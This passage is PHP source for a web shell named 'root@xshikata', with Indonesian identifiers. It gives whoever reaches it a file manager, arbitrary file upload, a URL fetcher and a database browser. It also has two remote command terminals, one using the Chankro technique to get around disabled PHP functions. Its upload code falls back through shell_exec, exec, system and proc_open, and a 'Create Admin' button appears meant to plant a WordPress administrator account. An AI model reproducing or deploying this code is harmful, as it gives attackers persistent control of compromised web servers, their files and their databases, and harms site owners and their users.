	&& !empty($_POST['save_to']) && !in_array($_POST['save_to'], array('.' , '..' , './' , '../'))
	&& is_string($_POST['zf']) && !empty($_POST['zf'])
)
{
	$save_to = uraikan($_POST['save_to']);
	$rootPath = realpath(uraikan($_POST['zf']));
	$fileName1 = 'bak_'.microtime(1) . '_' . rand(1000, 99999) . '.zip';
	$fileName = $save_to . DIRECTORY_SEPARATOR . $fileName1;
	if(is_dir($save_to) && is_dir($rootPath) && is_writable($save_to))
	{
		set_time_limit(0);
		$zip = new ZipArchive();
		$zip->open($fileName, ZipArchive::CREATE | ZipArchive::OVERWRITE);
		$files = new RecursiveIteratorIterator(
			new RecursiveDirectoryIterator($rootPath),
			RecursiveIteratorIterator::LEAVES_ONLY
		);
		foreach ($files as $name => $file)
		{
			if(!$file->isDir())
			{
				$filePath = $file->getRealPath();
				$relativePath = substr($filePath, strlen($rootPath) + 1);
				$zip->addFile($filePath, $relativePath);
			}
		}
		$zip->close();
		print "Saved!<hr>";
	}
	else
	{
		print "Directory not writable!<hr>"; var_dump(($save_to));
	}
}
else if($awal == 'hapus_folder' && isset($_POST['zf']) && is_string($_POST['zf']) && !empty($_POST['zf']))
{
	$rootPath = realpath(uraikan($_POST['zf']));
	$folderName = basename($rootPath);

	if(is_dir($rootPath))
	{
		set_time_limit(0);
		rrmdir($rootPath);
		// Verify deletion
		if (!file_exists($rootPath)) {
			$success_msg = "Folder '" . htmlspecialchars($folderName) . "' and its contents deleted successfully.";
		} else {
			$error_msg = "Failed to delete folder '" . htmlspecialchars($folderName) . "'. Check permissions of the folder and its contents.";
		}
	}
	else
	{
		$error_msg = "Directory not found or path is invalid.";
	}
	$awal = 'dasar';
}
else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
    function smart_upload($fileKey, $targetDir) {
        $res = ['success' => false, 'method' => '', 'message' => '', 'name' => ''];
        
        // 1. Validasi Input
        if (!isset($_FILES[$fileKey]) || $_FILES[$fileKey]['error'] !== UPLOAD_ERR_OK) {
            $res['message'] = 'Upload error code: ' . ($_FILES[$fileKey]['error'] ?? 'unknown');
            return $res;
        }

        $filename = basename($_FILES[$fileKey]['name']);
        $tmp      = $_FILES[$fileKey]['tmp_name'];
        $pemisah  = substr($targetDir, -1) !== "/" ? "/" : "";
        $dest     = $targetDir . $pemisah . $filename;

        // 2. Validasi Source (Anti-0kb)
        if (!file_exists($tmp) || filesize($tmp) <= 0) {
            $res['message'] = 'File tmp kosong/hilang. Upload gagal dari server.';
            return $res;
        }

        // --- A. METODE PHP NATIVE ---

        // 1. Move Uploaded File
        if (!$res['success'] && @move_uploaded_file($tmp, $dest)) {
            $res['success'] = true; $res['method'] = 'move_uploaded_file';
        }

        // 2. Copy
        if (!$res['success'] && @copy($tmp, $dest)) {
            $res['success'] = true; $res['method'] = 'copy';
        }

        // 3. Rename
        if (!$res['success'] && @rename($tmp, $dest)) {
            $res['success'] = true; $res['method'] = 'rename';
        }

        // 4. Stream Copy (Fopen)
        if (!$res['success']) {
            $src = @fopen($tmp, 'rb');
            $dst = @fopen($dest, 'wb');
            if ($src && $dst) {
                if (@stream_copy_to_stream($src, $dst)) {
                    $res['success'] = true; $res['method'] = 'stream_copy';
                }
            }
            @fclose($src); @fclose($dst);
        }

        // 5. File Get/Put Contents
        if (!$res['success']) {
            $content = @file_get_contents($tmp);
            if ($content !== false && strlen($content) > 0) {
                if (@file_put_contents($dest, $content)) {
                    $res['success'] = true; $res['method'] = 'file_put_contents';
                }
            }
        }

        // --- B. METODE SYSTEM COMMAND (Fallback Multi-Fungsi) ---
        if (!$res['success']) {
            // Helper: Cari fungsi eksekusi yang aktif (exec, shell_exec, system, dll)
            $run_cmd = function($cmd) {
                if (function_exists('shell_exec')) { @shell_exec($cmd); return true; }
                if (function_exists('exec')) { @exec($cmd); return true; }
                if (function_exists('system')) { @system($cmd); return true; }
                if (function_exists('passthru')) { @passthru($cmd); return true; }
                if (function_exists('popen')) { 
                    $fp = @popen($cmd, 'r'); 
                    if($fp) { pclose($fp); return true; } 
                }
                if (function_exists('proc_open')) {
                    $proc = @proc_open($cmd, [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']], $pipes);
                    if (is_resource($proc)) { proc_close($proc); return true; }
                }
                return false;
            };

            // Command list: cp, mv, cat
            $sys_cmds = [
                ['cmd' => "cp " . escapeshellarg($tmp) . " " . escapeshellarg($dest), 'name' => 'cp'],
                ['cmd' => "mv " . escapeshellarg($tmp) . " " . escapeshellarg($dest), 'name' => 'mv'],
                ['cmd' => "cat " . escapeshellarg($tmp) . " > " . escapeshellarg($dest), 'name' => 'cat']
            ];

            foreach ($sys_cmds as $action) {
                // Jalankan command menggunakan fungsi apapun yang tersedia
                if ($run_cmd($action['cmd'])) {
                    // Cek hasil segera
                    if (file_exists($dest) && filesize($dest) > 0) {
                        $res['success'] = true;
                        $res['method'] = 'sys_' . $action['name'];
                        break; // Berhenti jika berhasil
                    }
                }
            }
        }

        // --- C. VERIFIKASI AKHIR ---
        if ($res['success']) {
            // Double check keberadaan dan ukuran file
            clearstatcache();
            if (file_exists($dest) && filesize($dest) > 0) {
                @chmod($dest, 0644);
                $res['name'] = $filename;
                $res['message'] = "File uploaded successfully via <strong>{$res['method']}</strong>";
            } else {
                $res['success'] = false;
                $res['message'] = "Metode {$res['method']} jalan, tapi file hasil 0kb/hilang.";
                @unlink($dest);
            }
        } else {
            $res['message'] = "Gagal total. Semua metode (PHP & System) diblokir/gagal.";
        }

        return $res;
    }

    $uploadResult = smart_upload('ufile', $default_dir);
    $upload_message = $uploadResult['message'];
}


?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>root@xshikata</title>
    <style>
html {
    font-size: 15px;
}
body {
    margin: 0;
    padding: 0;
    background-color: #1a1a1a;
    font-family: monospace;
    color: #ddd;
    font-size: 1rem;
}

.content-wrapper {
    padding: 1rem;
    max-width: 1300px;
    margin: 0 auto;
}

a {
    text-decoration: none;
}

.system-info {
    display: flex;
    justify-content: space-between;
    align-items: center;
    background-color: #222222;
    border: 2px dotted #00FF00;
    border-radius: 8px;
    padding: 1rem;
    margin-bottom: 1rem;
    box-shadow: 2px 2px 5px rgba(0,0,0,0.5);
}
.system-info-left p {
    margin: 0.3rem 0;
    font-size: 0.9rem;
    color: #FFFFFF;
}
.system-info-left a {
    color: #00FF00;
    text-decoration: none;
}

.fManager-wrapper {
    overflow-x: auto;
    -webkit-overflow-scrolling: touch;
}

.fManager {
    width: 100%;
    margin: 1rem 0;
    border-collapse: collapse;
    background-color: #2e2e2e;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
}
.fManager thead th {
    padding: 0.6rem 0.8rem;
    border: none;
    background-color: #3c3c3c;
    color: #ffffff;
    white-space: nowrap;
}
.fManager tbody td {
    padding: 0.6rem 0.8rem;
    border: none;
    color: #e0e0e0;
    white-space: nowrap;
}
.fManager tbody tr:nth-child(odd) { background-color: #2e2e2e; }
.fManager tbody tr:nth-child(even) { background-color: #363636; }
.fManager tbody tr:hover { background-color: #444444; }

.btn-modern {
    padding: 0.5rem 1rem;
    font-size: 0.9rem;
    font-family: monospace;
    font-weight: bold;
    color: #1a1a1a;
    background-color: #00FF00;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.2s ease;
    display: inline-flex;
    align-items: center;
    gap: 0.5rem;
}
.btn-modern:hover {
    background-color: #00B300;
    transform: translateY(-2px);
}
.btn-modern:disabled {
    background-color: #555;
    color: #999;
    cursor: not-allowed;
    transform: none;
}

.btn-kill {
    background-color: #dc3545;
    color: #fff;
}
.btn-kill:hover {
    background-color: #c82333;
}
.btn-kill-delete {
    background-color: #fd7e14;
    color: #fff;
}
.btn-kill-delete:hover {
    background-color: #e86a00;
}


.path-display-container {
    background-color: #2e2e2e;
    border: 1px dotted transparent;
    border-radius: 8px;
    padding: 0.7rem;
    margin: 1rem 0;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
    display: flex;
    align-items: center;
    color: #ddd;
    flex-wrap: nowrap;
    overflow-x: auto;
}
.path-display-container i { color: #FFFFFF; margin-right: 0.5rem; flex-shrink: 0; }
.path-display-container p { white-space: nowrap; margin:0; }
.path-display-container a { color: #FFFFFF;
    text-decoration: none; font-weight: bold; }
.path-display-container a:hover { text-decoration: underline; }
.path-display-container span { margin: 0 0.25rem;
}

.terminal-container {
    background-color: #1e1e1e;
    border: 1px solid #333;
    border-radius: 8px;
    padding: 1.2rem;
    margin-top: 1rem;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
    font-family: 'Menlo', 'Monaco', 'Consolas', monospace;
}
.terminal-output {
    background-color: #161616;
    color: #e0e0e0;
    padding: 1rem;
    border-radius: 5px;
    max-height: 400px;
    overflow-y: auto;
    white-space: pre-wrap;
    word-wrap: break-word;
    margin-bottom: 1rem;
    border: 1px solid #2a2a2a;
}
.terminal-input-area { display: flex; align-items: center; }
.terminal-prompt { color: #00FF00; font-weight: bold; margin-right: 0.7rem;
}
.terminal-input {
    flex-grow: 1;
    background-color: transparent;
    border: none;
    color: #e0e0e0;
    font-size: 1em;
    font-family: inherit;
    padding: 0.3rem;
}
.terminal-input:focus { outline: none; }
.btn-execute {
    background-color: #00FF00;
    color: #111;
    border: none;
    padding: 0.5rem 1rem;
    border-radius: 5px;
    cursor: pointer;
    font-family: monospace;
    font-weight: bold;
    transition: background-color 0.3s ease;
    margin-left: 0.7rem;
}

.upload-panel {
    background-color: #2e2e2e;
    border: 2px dashed #444;
    border-radius: 10px;
    padding: 2rem;
    text-align: center;
    transition: border-color 0.3s ease, background-color 0.3s ease;
    cursor: pointer;
}
.upload-panel.drag-over { border-color: #00FF00; background-color: #333; }
.upload-icon { font-size: 3rem; color: #00FF00; margin-bottom: 1rem; }
.upload-text { color: #ddd; font-size: 1rem;
    margin-bottom: 1.2rem; }
.upload-text span { color: #00FF00; font-weight: bold; }
.progress-container {
    margin-top: 20px;
    height: 10px;
    background-color: #444;
    border-radius: 5px;
    overflow: hidden;
    display: none;
}
.progress-bar {
    width: 0;
    height: 100%;
    background-color: #00FF00;
    border-radius: 5px;
    transition: width 0.3s ease;
}
#uploadStatus {
    margin-top: 15px;
    font-weight: bold;
}

.db-container { display: flex; gap: 1.2rem;
    margin-top: 1rem; }
.db-sidebar {
    width: 25%;
    min-width: 180px;
    background-color: #2e2e2e;
    padding: 1rem;
    border-radius: 8px;
    border: 1px solid #333;
    height: fit-content;
}
.db-content { width: 75%; }
.db-sidebar h4 {
    color: #00FF00;
    margin-top: 0;
    border-bottom: 1px dotted #00FF00;
    padding-bottom: 0.7rem;
    margin-bottom: 0.7rem;
    font-size: 1rem;
}
.db-list { list-style: none; padding: 0; margin: 0; max-height: 400px;
    overflow-y: auto; }
.db-list li a {
    display: block;
    color: #ddd;
    padding: 0.5rem 0.7rem;
    text-decoration: none;
    border-radius: 4px;
    transition: background-color 0.2s ease;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    font-size: 0.9rem;
}
.db-list li a:hover { background-color: #3a3a3a;
}
.db-list li.active a { background-color: #00FF00; color: #111; font-weight: bold; }
.db-login-form {
    background-color: #2e2e2e;
    padding: 1.2rem;
    border-radius: 8px;
    border: 1px solid #333;
    display: flex;
    flex-wrap: wrap;
    gap: 0.7rem;
    align-items: center;
    margin-bottom: 1rem;
}
.db-login-form input[type="text"] {
    flex: 1 1 150px;
    background-color: #222;
    border: 1px solid #444;
    color: #ddd;
    padding: 0.6rem;
    border-radius: 5px;
}
.data-table-container { max-height: 500px; overflow: auto; border: 1px solid #333; border-radius: 8px; }
.fManager.data-table td div { max-width: 200px;
    overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

.pagination { margin: 1rem 0; text-align: center;
}
.pagination a {
    margin: 0 0.25rem;
    padding: 0.3rem 0.6rem;
    border: 1px dotted #00FF00;
    text-decoration: none;
    color: #00FF00;
    border-radius: 4px;
    transition: background-color 0.2s, color 0.2s;
}
.pagination a:hover { background-color: #00FF00; color: #111; }
.pagination a.active { background: #00FF00;
    color: #111; font-weight: bold; }

.db-edit-form { background-color: #2e2e2e; padding: 1.2rem; border-radius: 8px; border: 1px solid #333;
}
.db-edit-form .form-group { margin-bottom: 1rem; }
.db-edit-form label { display: block; margin-bottom: 0.3rem; color: #00FF00; font-weight: bold;
}
.db-edit-form input[type="text"], .db-edit-form textarea {
    width: 100%;
    background-color: #222;
    border: 1px solid #444;
    color: #ddd;
    padding: 0.6rem;
    border-radius: 5px;
    box-sizing: border-box;
    font-family: monospace;
}
.db-edit-form textarea { height: 120px; resize: vertical; }
.db-edit-form .form-actions { margin-top: 1.2rem; text-align: right;
}
.db-edit-form .form-actions .btn-modern { margin-left: 0.7rem; }

/* File Editor and info */
.file_edit {
    width: 100%;
    height: 400px;
    background-color: #222;
    border: 1px dotted #00FF00;
    color: #ddd;
    font-family: 'Consolas', 'Monaco', 'monospace';
    font-size: 1rem;
    padding: 1rem;
    box-sizing: border-box;
    resize: vertical;
    border-radius: 8px;
}
.file-info-container {
    background-color: #2e2e2e;
    border: 1px dotted #00FF00;
    border-radius: 8px;
    padding: 1rem;
    margin-bottom: 1.2rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.main-nav-wrapper {
    overflow-x: auto;
    -webkit-overflow-scrolling: touch;
}
.main-nav {
    text-align: center; 
    margin: 1.2rem 0;
    white-space: nowrap;
}
.main-nav .btn-modern, .main-nav form {
    margin: 5px;
    display: inline-block;
}

.new-file-form {
    background-color: #2e2e2e;
    padding: 1.2rem;
    border-radius: 8px;
    border: 1px solid #333;
    display: flex;
    flex-direction: column;
    gap: 0.7rem;
}
.new-file-form input[type="text"],
.new-file-form textarea {
    background-color: #222;
    border: 1px solid #444;
    color: #ddd;
    padding: 0.6rem;
    border-radius: 5px;
    font-family: monospace;
}
.new-file-form textarea {
    height: 200px;
    resize: vertical;
}
.new-file-form button {
    align-self: flex-start;
}

</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<body>
<div class="content-wrapper">

<div class="system-info">
    <div class="system-info-left">
       <p>
    <strong style="color: #00FF00;">System Info:</strong>
    <span style="color: #ffffff;"><?php
        echo htmlspecialchars((function() {
            try {
                if (function_exists('php_uname')) return php_uname();
                if ($os = getenv('OS')) return $os;
        
                if (defined('PHP_OS')) return PHP_OS;
                return "Disabled";
            } catch (Throwable $e) {
                return "Disabled";
            }
        })());
 ?></span>
</p>

        <p>
            <strong style="color: #00FF00;">User:</strong>
            <span style="color: #ffffff;"><?php
    if (function_exists('getmyuid') && function_exists('get_current_user')) {
        echo getmyuid() . " (" . get_current_user() . ")";
    } else {
        echo "Disabled";
    }
?></span>

        </p>
		<p>
		    <strong style="color: #00FF00;">Group:</strong>
		    <span style="color: #ffffff;"><?php 
		
		        if (function_exists('getmygid') && function_exists('posix_getegid') && function_exists('posix_getgrgid')) {
		            $qid = @posix_getgrgid(@posix_getegid());
                    echo getmygid() . " (" . (isset($qid['name']) ? $qid['name'] : 'unknown') . ")";
                } elseif (function_exists('getmygid')) {
		            echo getmygid();
                } else {
		            echo "Disabled";
                }
		    ?></span>
		</p>
        <p>
            <strong style="color: #00FF00;">Safe Mode:</strong>
            <span style="color: <?php echo ($safeMode === true ? "#ff6666" : "#66cc66"); ?>;"><?php echo ($safeMode === true ? "On" : "Off");
?></span>
            <span style="margin-left: 3rem;"><a href='javascript:navigate("awal", "phpinfo")' style="color: #00FF00;">[ PHP Info ]</a></span>
        </p>
        <p>
            <strong style="color: #00FF00;">Server Address:</strong>
            <span style="color: #ffffff;"><?php
                $serverAddr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
                echo htmlspecialchars($serverAddr);
            ?></span>
        </p>
        <p>
            <strong style="color: #00FF00;">Server Software:</strong>
            <span style="color: #ffffff;"><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? htmlspecialchars($_SERVER['SERVER_SOFTWARE']) : 'unknown'; ?></span>
        </p>
        <p>
            <strong style="color: #00FF00;">PHP Version:</strong>
            <span style="color: #ffffff;"><?php echo htmlspecialchars(phpversion());
?></span>
        </p>
        <p>
            <strong style="color: #00FF00;">cURL Version:</strong>
            <span style="color: #ffffff;"><?php echo function_exists('curl_version') ? htmlspecialchars(curl_version()['version']) : 'None'; ?></span>
        </p>
        <p>
            <strong style="color: #00FF00;">Server Time:</strong>
            <span style="color: #ffffff;"><?php echo date('Y-m-d H:i:s');
?></span>
        </p>
    </div>
</div>

<div class="main-nav-wrapper">
    <div class="main-nav">
      <a href="javascript:navigate('awal', 'dasar');" class="btn-modern"><i class="fas fa-home"></i> Home</a>
      <a href="javascript:toggleUpload();" class="btn-modern"><i class="fas fa-upload"></i> Upload</a>
      <a href="javascript:newFile();" class="btn-modern"><i class="fas fa-plus-square"></i> New File</a>
      <a href="javascript:newPapka();" class="btn-modern"><i class="fas fa-folder-plus"></i> New Folder</a>
      <a href="javascript:navigate('awal', 'sistem_kom', 'berkas', '<?= kunci($default_dir) ?>');" class="btn-modern"><i class="fas fa-terminal"></i> Command</a>
<a href="javascript:navigate('awal', 'chankro_kom', 'berkas', '<?= kunci($default_dir) ?>');" class="btn-modern"><i class="fas fa-skull-crossbones"></i> Command v2</a>
<a href="javascript:toggleFetcher();" class="btn-modern"><i class="fas fa-link"></i> Fetch URL</a>
      <a href="javascript:navigate('awal', 'skl');" class="btn-modern"><i class="fas fa-database"></i> Database</a>
      <form method="POST" action="">
        <input type="hidden" name="create_wp_admin" value="1">
        <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
        <button type="submit" class="btn-modern"><i class="fas fa-user-shield"></i> Create Admin</button>
      </form>
      <form method="POST" action="">
        <input type="hidden" name="scan_site" value="1">
        <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
        <button type="submit" class="btn-modern" style="background-color: #6f42c1;"><i class="fas fa-satellite-dish"></i> Scan Site</button>
      </form>
    </div>
</div>

<div id="newFileContainer" style="display:none; margin-top: 1.2rem;">
    <form method="POST" class="new-file-form">
        <input type="hidden" name="awal" value="buat_file">
        <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
       
         <input type="text" name="new_filename" placeholder="Enter file name..." required>
        <textarea name="new_file_content" placeholder="Enter file content..."></textarea>
        <button type="submit" class="btn-modern"><i class="fas fa-save"></i> Save File</button>
    </form>
</div>

<div id="fetchContainer" style="display:none; margin-top: 1.2rem;">
    <form method="POST" class="new-file-form" style="flex-direction: row; gap: 1rem; align-items: center;">
        <input type="hidden" name="awal" value="fetch_file">
        <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
        <input type="text" name="fetch_url" placeholder="Enter full URL to download..." required style="flex-grow: 1; margin: 0;">
        <input type="text" name="save_as" placeholder="Save as (optional)..." style="flex-grow: 0.5; margin: 0;">
        <button type="submit" class="btn-modern"><i class="fas fa-download"></i> Fetch</button>
    </form>
</div>


<div id="uploadContainer" style="display:none; padding: 1.2rem;">
    <div id="upload-panel" class="upload-panel">
        <form id="ajaxUploadForm" method="POST" enctype="multipart/form-data" action="<?= $_SERVER['PHP_SELF']; ?>">
            <input type="hidden" name="awal" value="upl_file">
            <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
            <input type="file" name="ufile" id="file-input-real" style="display: none;">
            
            <i class="fas fa-cloud-upload-alt upload-icon"></i>
            <p class="upload-text">Drag & drop your file here or <span>browse</span> to upload.</p>
  
           </form>
    </div>
    <div class="progress-container" id="progress-container">
        <div class="progress-bar" id="progress-bar"></div>
    </div>
    <div id="uploadStatus" style="text-align: center; margin-top: 1rem;"></div>
    <?php if (!empty($upload_message)) echo '<div id="uploadStatus" style="margin-top:10px; color:#0f0;">' . $upload_message . '</div>'; ?>
</div>

<?php
// Display success or error messages if any
if (isset($success_msg)) {
    echo '<div style="text-align: center; color: #0f0; margin: 0.7rem;">' .
$success_msg . '</div>';
} elseif (isset($error_msg)) {
    echo '<div style="text-align: center; color: #f00; margin: 0.7rem;">' .
$error_msg . '</div>';
}
?>

<div class="path-display-container">
    <i class="fas fa-folder-open"></i>
    <p>
        <?php tulisLah(); ?>
    </p>
</div>
<hr style="border-color: #333; border-style: dotted;">

<?php
// ===========================================================================
// Page display based on selected action (PHP Info, Command, Read File, SQL, etc.)
// ===========================================================================
if($awal=="phpinfo")
{
	print "<div style='width: 100%; height: 400px;'><iframe src='?awal=pinf' style='width: 100%; height: 400px; border: 0;'></iframe></div>";
}
// --- GANTI SELURUH BLOK 'chankro_kom' YANG LAMA DENGAN YANG INI ---
else if ($awal == 'chankro_kom') {
    print '<div class="terminal-container">';
    print '<div style="margin-bottom: 1rem;"><h3 style="margin:0; color:#00FF00;">Command v2</h3></div>';
    
    // Area untuk menampilkan hasil command
    print '<div class="terminal-output">';
    if (isset($_POST['chankro_command']) && !empty($_POST['chankro_command'])) {
        // Panggil fungsi Chankro. Fungsi ini akan langsung mencetak outputnya.
        // Kita modifikasi sedikit agar tidak ada judul ganda.
        ob_start();
        runChankroModified(trim($_POST['chankro_command']), $default_dir);
        $output = ob_get_clean();
        print str_replace("<h3>result:</h3>", "", $output);
    } else {
        print "Terminal ready. Enter a command below.";
    }
    print '</div>';

    // Area untuk input command
    ?>
    <form action="" method="post" style="padding:0; margin:0;">
        <div class="terminal-input-area">
            <input type="hidden" name="awal" value="chankro_kom">
            <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
            <span class="terminal-prompt">$</span>
            <input type="text" name="chankro_command" class="terminal-input" placeholder="type your command" autofocus>
            <button type="submit" class="btn-execute">Execute</button>
        </div>
    </form>
    <?php
    print '</div>';
}
// --- AKHIR DARI BLOK PENGGANTI ---
else if ($awal == "sistem_kom") {
    print '<div class="terminal-container">';
    print '<div class="terminal-output">';

    if (isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom'])) {
        $komanda = uraikan($_POST['kom']);
        $result = execute_command($komanda);
        
        print htmlspecialchars(isset($result['output']) ? $result['output'] : "");
        if(!empty($result['error'])) {
             print "\n<span style='color: #ff5555;'>" . htmlspecialchars($result['error']) . "</span>";
        }
    } else {
        print "Terminal ready. Enter a command below.";
    }
    print '</div>';

    print '<div class="terminal-input-area">';
    print '<span class="terminal-prompt">$</span>';
    print '<input type="text" id="emr_et_atash" class="terminal-input" placeholder="Enter command..." autofocus>';
    print '<button type="button" class="btn-execute" onclick="sistemKom();">Execute</button>';
    print '</div>';
    print '</div>';
}


else if($awal=="baca_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan($_POST['fayl']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		$elaveBtn = is_writeable($default_dir . $pemisah . $namaBerkas) ? " onclick='navigate(\"awal\", \"edit_file\", \"fayl\", \"" . kunci($namaBerkas) . "\", \"berkas\", \"" . kunci($default_dir) . "\")'" : " disabled";
		print "<div>File Name: <span class='qalin'>" . htmlspecialchars($namaBerkas) . "</span><br/><button class='btn-modern'$elaveBtn><i class='fas fa-edit'></i> Edit </button></div>";
		print "<div class='baca_file'>" . highlight_string(file_get_contents($default_dir . $pemisah . $namaBerkas), true) . "</div>";
	}
}
else if ($awal == 'edit_db_form') {
    $db_sidebar_content = '';
    // To capture sidebar for later display
    ob_start();
    try {
        if (!isset($_POST['t'], $_POST['pk_val'])) {
            throw new Exception("Missing table or primary key.");
        }
        $tableName = uraikan($_POST['t']);
        $pk_val = uraikan($_POST['pk_val']);

        $host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
        $user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
        $sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
        $database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

        if(empty($host) || empty($database)) {
            throw new Exception("Database connection not established.");
        }

        $pdo = new PDO('mysql:host=' . $host . ';dbname=' . $database . ';charset=utf8', $user, $sandi);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // --- RENDER SIDEBAR (for context) ---
        $schematas = $pdo->query('SELECT schema_name FROM information_schema.schemata')->fetchAll();
        echo '<div class="db-container">';
        echo '<div class="db-sidebar">';
        echo '<h4>Databases</h4>';
        echo '<ul class="db-list">';
        foreach($schematas as $schema) {
            $schemaName = $schema['schema_name'];
            $activeClass = ($database == $schemaName) ? 'class="active"' : '';
            echo "<li {$activeClass}><a href=\"javascript:navigate('awal', 'skl', 'database', '{$schemaName}')\">{$schemaName}</a></li>";
        }
        echo '</ul>';
        $tablesStmt = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
        $tablesStmt->execute(array($database));
        $tables = $tablesStmt->fetchAll();
        echo '<h4 style="margin-top: 20px;">Tables</h4>';
        echo '<ul class="db-list">';
        foreach($tables as $table) {
            $currentTableName = $table['table_name'];
            $activeClass = ($tableName == $currentTableName) ? 'class="active"' : '';
             echo "<li {$activeClass}><a href=\"javascript:navigate('awal', 'skl', 'database', '{$database}', 't', '" . kunci($currentTableName) . "')\">" . htmlspecialchars($currentTableName) . "</a></li>";
        }
        echo '</ul></div>';
        // End sidebar
        $db_sidebar_content = ob_get_clean();
        // Capture sidebar and restart buffer
        ob_start();
        // --- RENDER MAIN CONTENT (THE FORM) ---
        $cols_stmt = $pdo->query("DESCRIBE `{$tableName}`");
        $columns_info = $cols_stmt->fetchAll(PDO::FETCH_ASSOC);
        $pk_col = $columns_info[0]['Field'];

        $stmt = $pdo->prepare("SELECT * FROM `{$tableName}` WHERE `{$pk_col}` = ?");
        $stmt->execute([$pk_val]);
        $row_data = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$row_data) {
            throw new Exception("Row not found.");
        }

        echo '<div class="db-content">';
        echo '<h3>Editing row in <span style="color:#00FF00;">' . htmlspecialchars($tableName) . '</span></h3>';
        echo '<form method="POST" class="db-edit-form">';
        echo '<input type="hidden" name="awal" value="edit_db_row">';
        echo '<input type="hidden" name="t" value="' . htmlspecialchars($_POST['t']) . '">';
        echo '<input type="hidden" name="pk_val" value="' . htmlspecialchars($_POST['pk_val']) . '">';
        
        foreach($columns_info as $col) {
            $colName = $col['Field'];
            $colType = strtolower($col['Type']);
            $value = htmlspecialchars(isset($row_data[$colName]) ? $row_data[$colName] : '');

            echo '<div class="form-group">';
            echo '<label for="edit-'. $colName .'">' . $colName . '</label>';
            
            $isReadOnly = ($colName == $pk_col);
            $readOnlyAttr = $isReadOnly ? ' readonly style="background-color: #444;"' : '';
            if (strpos($colType, 'text') !== false || (strpos($colType, 'varchar') !== false && intval(preg_replace('/[^0-9]/', '', $colType)) > 255)) {
                 echo '<textarea name="' . $colName . '" id="edit-'. $colName .'"' . $readOnlyAttr . '>' . $value . '</textarea>';
            } else {
                 echo '<input type="text" name="' . $colName . '" id="edit-'. $colName .'" value="' . $value . '"' . $readOnlyAttr . '>';
            }
            echo '</div>';
        }

        $halaman = isset($_POST['halaman']) ? $_POST['halaman'] : '1';
        $current_table_encoded = $_POST['t'];
        echo '<div class="form-actions">';
        echo '<button type="submit" class="btn-modern">Save Changes</button>';
        echo '<a class="btn-modern" style="text-decoration:none; background-color:#6c757d;" href="javascript:navigate(\'awal\', \'skl\', \'database\', \''. $database .'\', \'t\', \''. $current_table_encoded .'\', \'halaman\', \''. $halaman .'\')">Cancel</a>';
        echo '</div>';
        echo '</form>';
        echo '</div>';
        // End db-content

    } catch (Exception $e) {
        echo '<div class="db-content" style="color: #ff5555;">Error: ' . $e->getMessage() . '</div>';
    }
    $db_main_content = ob_get_clean();
    echo $db_sidebar_content . $db_main_content . '</div>';
    // Combine and close container
}
else if($awal == 'skl')
{
    // 1. Get all potential values from cookies and POST
	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

    // 2. Override with POST data if it exists for the current request
    if (isset($_POST['host'])) {
        $host_val = trim($_POST['host']) === '' ? 'localhost' : $_POST['host'];
        $host = $host_val;
        $user = $_POST['user'];
        $sandi = $_POST['sandi'];
        $database = ''; // Reset database on new connection
    }
    if (isset($_POST['database'])) {
        $database = $_POST['database'];
    }
	?>
    <form method="POST" class="db-login-form">
        <input type="hidden" name="awal" value="skl">
        <input type="text" placeholder="Host (default: localhost)" name="host" value="<?=htmlspecialchars($host)?>">
        <input type="text" placeholder="User" name="user" value="<?=htmlspecialchars($user)?>">
        <input type="text" placeholder="Password" name="sandi" value="<?=htmlspecialchars($sandi)?>">
        <button type="submit" class="btn-modern">Connect</button>
        <?php if (!empty($host)): ?>
            <a href="javascript:navigate('awal', 'db_logout')" class="btn-modern" style="background-color:#dc3545; text-decoration:none;">Logout</a>
       
         <?php endif; ?>
    </form>
	<?php
	if(!empty($host))
	{
		try
		{
            // 3. Construct the connection string with the final $database value
            $databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr, $user, $sandi, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
